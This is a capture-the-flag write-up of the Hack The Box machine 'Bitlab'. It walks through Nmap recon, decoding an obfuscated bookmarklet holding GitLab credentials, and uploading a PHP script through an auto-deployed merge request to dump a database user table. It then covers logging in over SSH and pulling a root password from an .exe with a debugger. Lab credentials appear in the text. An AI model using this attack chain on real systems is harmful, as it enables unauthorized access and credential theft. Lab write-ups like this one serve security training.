<center><h1>Bitlab</h1></center>
<br>
First I run an Nmap scan

```
# Nmap 7.80 scan initiated Wed Oct 30 20:31:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/Documents/HTB2/Bitlab/10.10.10.114/scans/_quick_tcp_nmap.txt -oX /root/Documents/HTB2/Bitlab/10.10.10.114/scans/xml/_quick_tcp_nmap.xml 10.10.10.114
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up, received user-set (0.058s latency).
Scanned at 2019-10-30 20:31:26 EDT for 16s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSCR2AISBaUSpQGOWjsr3qEJ0/8CcRP0256a8V8+RP3/s8C2JjPF0VpQ0yREJi5GcaxaUT71Z/Iu4L+zSuGErOswMYOASHTsLQ1OiOX+pFPGos7dCho50xTZW/t7fznxpOZz5Z/q2vw68B+9w3nYBuSHgcOCJl9UVhd7nyzxdaTScQg3CLy3LbOmERh1PN/sVTYEncJgVZjZAWNj3Y1WCIsQaJS24IWHjDKv883oEVgRr9K7aF95SSpLdH1aG/uvQFEoYsE+/WvqD8lPZ+nbxmGVZWHVdHzKDHXJZTcMosAYi/OAdb8qrb17Rs1Uq66caY/GnTRMDNI73HK4PfUeQp
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOTiIG0kUQzECqcEHxHyiK1WbdkW2Ncwk5twrushVNzzMgnydxaua2m3mg5k8UWt1HXeUOyUxTpXaoaPa7Gclg4=
|   256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMsgauIgMgKCiPSybbXatTK8ZsAgv7xsrJsR5FZ5M77i
80/tcp open  http    syn-ack ttl 62 nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 55 disallowed entries (40 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
| /s/ /snippets/new /snippets/*/edit /snippets/*/raw 
| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity 
| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/* 
| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new 
| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new 
| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit 
| /*/*/merge_requests/new /*/*/merge_requests/*.patch 
|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 30 20:31:42 2019 -- 1 IP address (1 host up) scanned in 16.30 seconds
```
Only a couple ports open. From this scan, I see that there is a ```robots.txt``` file so I check that out. There I see that I wont be able to run a gobuster against the server since there is a limit that I can only send 1 request per second. The robots.txt file does however list some directories that I can check out, specifically the ```/help``` directory. There I find a ```bookmarks.html``` webpage and checking out the source code reveals a strang looking javascript function.
```
<!DOCTYPE NETSCAPE-Bookmark-file-1>
<!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! -->
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1>Bookmarks</H1>
<DL><p>
    <DT><H3 ADD_DATE="1564422476" LAST_MODIFIED="0" PERSONAL_TOOLBAR_FOLDER="true">Bookmarks bar</H3>
    <DL><p>
        <DT><A HREF="https://www.hackthebox.eu/" ADD_DATE="1554931938" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACuklEQVQ4jW2Tz2tcdRTFP+d+33szmUlGjCh0pppQrQYLlcaiRloxi2zERUUR7FYXutCVC/8AFy7MRkHc+B+04EqQLiIqKCqiBSUKRqLplCyMZl7n13vzvtfFi6Vg7/bcc7jcc46oR4ADdO87cS6YXna0jtM7Qq8J36qif9T/Y+fLWzni5nRbx5fa78h4VZBCRKpF3REYDqVHPtzbHb4F/dF/Ktbtdpsha31swTbwKsZKcTrGZqUEkKTujTmiBTcULFbxSjHOn9vf3x8HwO9YvGczJOGlWVFNh7lCkrk9sDrT+sUxp84VxEo62DcbDkQIsUjS8KAsXRgc/v2Jer3lJyxLv4gzp9WJtroxVe+hGdOh+P1qKoDl06XPzTt72wnfX2n4aGDREhGL8nzo3HXn20nQ6vBQ8ckLE3v2tRHTkfju06auftbw6zsJFtDK4yWPPTPl8ED65dvM51qeRHmaCFt33EHWbMOlzTa7PyV66sWJn39hIoC/rptf2mxr+dTMO3dHBOa4C1tPhI65O4AEhAA7P6T+6zepnn9zCMDld9tKMvzE6RLVf5U7CB1L3GsiR0GwAK2OEyNURY3MLzpmNVYbe7TvyJD3JXDHZc44F6OBhOMWbpJ8NJDGuUBe7wqQ982JW6qPiOVEnNmYcvJs6ZOhNL4hH9+QT4bSybOln9koKKcARCE5cUu93tKaZdnnsXIac9EeebrQylrBZCgWFuuk5gfyZtvZ/jrjx63Mp2OLFmobBXB86f73Qgivz2bVdJwrTTJ078qMh9cKAH7+KuPP7YSqxJvzXiZJaFRV9f7e7m9v/C/K7lV0VyxGbmVpAkjT6FlLUXLTUZSrYnSh3+9PAuB5npeDf5qXFzppB+lRoTRJUTbnZE0nSWVC5mgWKz7Y2x29kuf90a1tvE2dWcd1VGe/Jrhtnf8FOj1caqcXEh4AAAAASUVORK5CYII=">Hack The Box :: Penetration Testing Labs</A>
        <DT><A HREF="https://www.docker.com/" ADD_DATE="1554931981" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACE0lEQVQ4jbWTu2tUURDGf3P23JvdKxvRGIwEA1okmNSWAcFCBIs0+QfEF0hsFFtPwNIHKFosWGhhYbCzEERMQCIoiBYJCpEYAxJNk6e5u3vOGYtdkvVBsPGDYZhhHh/fnAPbwTmDU7Ntzf/Fva/XqMzfBmQz9xsj2/SCKoyOClP9wsC0MtUvxHgAKIETuAKI4iS2DpDWgMr8LXxtEGNnIOxDzCJSSDiz/wQAR15YhjqPsjTwDCcRp8bi1NDxsYtAmVp1FfQLhG8QFJF1qCdcf9dLVlonD3sp736K/XQWqOAkNhjcmbmKMILyHGO6sckc3ndTsMugBqULa2dZWRtlR+kN+foiWft7fHW8wN2Z40AvsIzIEkoOugaaI6wSwwYavhPjEhI68dVBitkuNPbg/RML5j7W7EHjDzQmiEQ0GiASQ1MjUTQakmJKqEP0F1nJH3J5YMFC/EyIHfhahgioyqa82qqw1kmzgJjXnDt4o3FSZywhvKSteJh6rYaQILLVJpvbA6ZgEfGE/BIgDKvBSTBAhRBWSNtSotYBj2qLRUizhDTboFo9xflDk6AwJgHAMNL3Ae9PkhQXyMoppfaErD0h29nwSRoQM0EtH+JC3wOcM7DF0qIqiDzm5vQkxdIxfN6HUqYgG2DnSJNXnO55i5tta9b+8hKb+qj8mfw3tDSq8IjmRxkDhmF6XGAi4txftjbwE2NZ43Pq//CoAAAAAElFTkSuQmCC">Enterprise Application Container Platform | Docker</A>
        <DT><A HREF="https://www.php.net/" ADD_DATE="1554931999" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAb0lEQVQ4jWNsaDjAQApgIkk1ORpY0Pjh4eIQxsqVL4m1QVNTk4ANWE0NDxeHcNFlr1+/Dld0/fp1glwmZA7cMXi4dAtWiHXILkYGyLIscFcywMLh+vXrcAamLMJJ8DDFZCCzmfC4BNl4OGCkeWoFAHM4Vw1BMLruAAAAAElFTkSuQmCC">PHP: Hypertext Preprocessor</A>
        <DT><A HREF="https://nodejs.org/en/" ADD_DATE="1554932008" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jW2TT4iVVRjGn+c957vfnWlmuNZgKCkEhS7cmSS2aTe00M0wQn9IsRSCIMyFMbgqdKVtok2Bi1EQvAspMHATbVwWLQpiQKjUHJs7c6/3u/f77vfvPC6u84forA6H933Oy/vjB2w7CzcX3Mb9/A/vv3Xh9plfz9489cvpq+/M/V8NAHD8CNc+jhoAPr4zv3+SzUVfR++ZYpZ5QL+fBzNcQ8Clr08sLW8EtY+3a24kvXv99ZnZl3afi0L86WQ8OVX1glR5hYoYpgVdw5G1EiOv9P7ufHn1/PfJ5gSnb8/NT+2ILkZuYl8YGFzdKK00jxChLoCiCMiyvPLeR1PTTSDojxpavDz/7S1789zR2ezfaMk89+XDsgxBAuApEgGEQICE0RdlqUE/K513+//pdJbwwczztucVb3XSHKaPGczDAQQkwiAYRKMAiQLrOkCC6z4ZhIdrnfTgnlfNWvFIzThivtY0lQAgApSe/S6BBEmjyrpmFYIe9boWAtiabcl6+SyjmLQ6QtH3NAcoiOQ2TAAUSEDoDRKm+QjeO/Y6PRqeG8AZETUMf/71BEUeYEZIgKQt3hSMRFYV8GaILQKmpmGjaiQfU0kxxOp6X49XUjhPSALJbSGERIBQpRrNhlerSGXNVpMZ07Cy3g2NhuejlUSDtJD3JkHjJRICJFCiyKwqQgjSzhdepE3s7YYHq+szRajNOauKssKDhz2ajTEqiAgaoxxvo3beLCmy6coVwb557ae1pFueNPKei13U8I4rnaTqDTK5yCRKGk9QEaSfiCIG3Cvq6mT7wztdBwD3f7z/+643dl8nANIOoWGNPCuxq7VDdQXUQXSxd6Msz7O8uDJYzU7c/fzuz1uUFuDQHst05OKRA867xVCFtw+8vBc7p1sYpgVGo/JGkiaXrn1067f/9myZuYBNVQ9/cfjY0a/mlj/77szyJzdOHdvUeVyzKeFT9k18v9LwrSUAAAAASUVORK5CYII=">Node.js</A>
        <DT><A HREF="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142">Gitlab Login</A>
    </DL><p>
</DL><p>
```
I took that strange javascript function over to *[this website](http://ddecode.com/hexdecoder/)* to decode it and looking closely I see a username and password.
```
javascript:(function(){ var _0x4b18=[&quot;value&quot;,&quot;user_login&quot;,&quot;getElementById&quot;,&quot;clave&quot;,&quot;user_password&quot;,&quot;11des0081x
```
I used these to log into the webpage and was greeted with two Projects. One ```Administrator/Profile``` project which I had write permission too and another ```Administrator/Deployer``` which I only had read permission too. Taking a look at both projects and the code that was inside of both gave me a good idea of what I had to do. This small snippet of code below from the ```Administrator/Deployer``` project basically says that whatever I upload the to the master branch of the ```Administrator/Profile``` project using a merge request will be downloaded to the server using ```git pull``` to the ```/profile``` directory. 
```
if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}
```
I had also found some php code that access's a ```postgresql``` database. Using the knowledge from above I can upload some php code that reads the usernames and passwords and prints them out to the screen. I used all the original code and added on a few lines.
```
Original:
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");

Final:
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
$arr = pg_fetch_all($result);

print_r($arr);
```
I uploaded the file as data.php, submitted the merge request, and then navigated to ```http://10.10.10.114/profile/data.php```. It prints out the information for one user
```
Array ( [0] => Array ( [id] => 1 [username] => clave [password] => c3NoLXN0cjBuZy1wQHNz== ) )
```
Now first thing I did was decode the password from base64 and tried to log into SSH with it but that did not work. After a couple minutes I decided to just try and enter the base64 encoded password as the actually password and to my surprise it worked. I am now SSH'd in as the user ```clave``` and from here I can read the ```user.txt``` file.
```
clave@bitlab:~$ cat user.txt 
1e3fd81ec3aa2f14***************
```
Now for the privilege escalation it was pretty obvious what I was going to have to do. There was an .exe file in claves home directory which obviously does not belong which means it is what I should be looking at. Being an .exe file I am also assuming I am going to have to do some reverse engineering. I copied the file over to my kali machine using ```scp``` and since I was dealing with an .exe file I used ```ollydbg``` to debug the program. 
<br>
Scrolling through the program I see that putty is used.

<center><img src="/htb/bitlab/putty.png"></center>
<br>
You need credentials to use putty so I decided to set a breakpoint right before the program executes. When I run the program, it stops at the breakpoint and taking a look at the registers I am able to see the root credentials.

<center><img src="/htb/bitlab/creds.png"></center>
<br>
Now I can just use the command ```su -``` with the password ```Qf7]8YSV.wDNF*[7d?j&eD4^``` to escalte from the user ```clave``` to ```root```. From there I can read the ```root.txt``` file.
```
clave@bitlab:~$ su -
Password: 
root@bitlab:~# cat root.txt
8d4cc131757957***************
```
<br><br><br><br>
